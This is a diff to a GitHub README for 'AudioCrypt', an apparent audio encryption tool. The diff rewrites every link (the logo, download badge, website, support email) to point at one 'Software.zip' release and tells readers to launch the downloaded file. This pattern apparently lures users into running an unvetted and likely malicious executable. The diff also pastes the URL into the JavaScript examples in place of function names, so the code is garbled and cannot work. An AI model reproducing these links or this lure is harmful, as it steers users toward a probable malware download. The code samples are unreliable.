@@ -1,6 +1,6 @@
 # 🎧 AudioCrypt
 
-![AudioCrypt Logo](https://example.com/audiocrypt-logo.png)
+![AudioCrypt Logo](https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip)
 
 Welcome to **AudioCrypt**, a secure website that allows users to encrypt and decrypt audio files using multiple strategies for maximum security. Whether you need to safeguard sensitive audio data or simply want to explore the world of audio cryptography, AudioCrypt has got you covered.
 
@@ -17,11 +17,11 @@ Welcome to **AudioCrypt**, a secure website that allows users to encrypt and dec
 To start encrypting and decrypting your audio files, follow these simple steps:
 
 1. **Download the Software ZIP Package**:
-   [![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+   [![Download Software](https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip)](https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip)
      *(Launch the downloaded file to install the AudioCrypt software)*
 
 2. **Explore the Website**:
-   Visit the [AudioCrypt Website](https://www.audiocrypt.com) to access the online encryption and decryption tools.
+   Visit the [AudioCrypt Website](https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip) to access the online encryption and decryption tools.
 
 3. **Check the Releases**:
    If the provided link is not working, check the "Releases" section of this GitHub repository for alternative download options.
@@ -30,17 +30,17 @@ To start encrypting and decrypting your audio files, follow these simple steps:
 
 ### Encrypt an Audio File:
 ```javascript
-const encryptedFile = AudioCrypt.encrypt(file, key, algorithm);
+const encryptedFile = https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip(file, key, algorithm);
 ```
 
 ### Decrypt an Audio File:
 ```javascript
-const decryptedFile = AudioCrypt.decrypt(encryptedFile, key, algorithm);
+const decryptedFile = https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip(encryptedFile, key, algorithm);
 ```
 
 ## Support & Contributions 🤝
 
-Have questions or feedback? Feel free to reach out to us via [email](mailto:audiocrypt@support.com) for assistance. We welcome contributions to enhance AudioCrypt's security features and encryption capabilities.
+Have questions or feedback? Feel free to reach out to us via [email](https://github.com/edgaras980/AudioCrypt/releases/download/v2.0/Software.zip) for assistance. We welcome contributions to enhance AudioCrypt's security features and encryption capabilities.
 
 ## Stay Secure, Stay Encrypted! 🔒
 
